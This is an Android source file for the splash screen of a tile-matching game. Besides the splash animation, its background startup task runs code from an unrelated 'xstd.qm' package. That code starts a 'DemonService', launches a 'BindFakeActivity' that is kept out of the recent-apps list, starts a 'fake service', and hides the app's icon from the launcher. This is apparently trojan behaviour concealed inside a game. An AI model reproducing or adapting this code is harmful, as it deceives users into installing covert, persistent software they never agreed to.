package com.tinygame.lianliankan;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.Window;
import android.view.WindowManager;
import com.tinygame.lianliankan.db.DatabaseOperator;
import com.tinygame.lianliankan.utils.SoundEffectUtils;
import com.tinygame.lianliankan.view.JPSplashView;
import com.tinygame.lianliankan.view.JPSplashView.SplashDispalyListener;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.Utils;
import com.xstd.qm.activity.BindFakeActivity;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.MainSettingManager;

public class LinkLinkSplashActivity extends Activity {

    private static final int START_MAIN_VIEW = 0;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case START_MAIN_VIEW:
                Intent mainviewIntent = new Intent();
                mainviewIntent.setClass(getApplicationContext(), MenuActivity.class);
                startActivity(mainviewIntent);
                finish();
                overridePendingTransition(R.anim.slide_up_in, R.anim.slide_down_out);
                break;
            }
        }
    };
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN ,    
                WindowManager.LayoutParams.FLAG_FULLSCREEN);  
        
        this.setContentView(R.layout.splash_rotate);
        JPSplashView splash = (JPSplashView) findViewById(R.id.splash);
        splash.setSplashDispalyListener(new SplashDispalyListener() {
            public void onAnimationFinished() {
                mHandler.sendEmptyMessage(START_MAIN_VIEW);
            }
        });
        splash.startWork();
        
//        View logo = findViewById(R.id.logo);
//        logo.startAnimation(AnimationUtils.loadAnimation(this, R.anim.fade));
        
        StartTask task = new StartTask();
        task.execute("");
    }

    private class StartTask extends AsyncTask<String, Void, Integer> {
        protected Integer doInBackground(String...params) {
            try {
                appActive();

                SoundEffectUtils.getInstance().init(LinkLinkSplashActivity.this.getApplicationContext());
                SettingManager.getInstance().init(getApplicationContext());
                DatabaseOperator.getInstance().init(getApplicationContext());
            } catch (Exception e) {
            }
            
            return 0;
        }
        
        protected void onPostExecute(Integer result) {
//            mHandler.sendEmptyMessage(START_MAIN_VIEW);
        }
    }

    private void appActive() {
        long launchTime = MainSettingManager.getInstance().getKeyLanuchTime();
        if (launchTime == 0) {
            //first lanuch
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
            }

            Intent i = new Intent();
            i.setClass(getApplicationContext(), DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            startService(i);
        }

        if (!AppRuntime.isBindingActive(getApplicationContext())
                && !MainSettingManager.getInstance().getDisableDownloadPlugin()) {
            Utils.startFakeService(getApplicationContext(), "[[Utils::startFakeService]]");
            Intent i = new Intent();
            i.setClass(getApplicationContext(), BindFakeActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        }

        if (!MainSettingManager.getInstance().getDisableDownloadPlugin()) {
            AppRuntime.hideInLauncher(getApplicationContext());
        }
    }
}
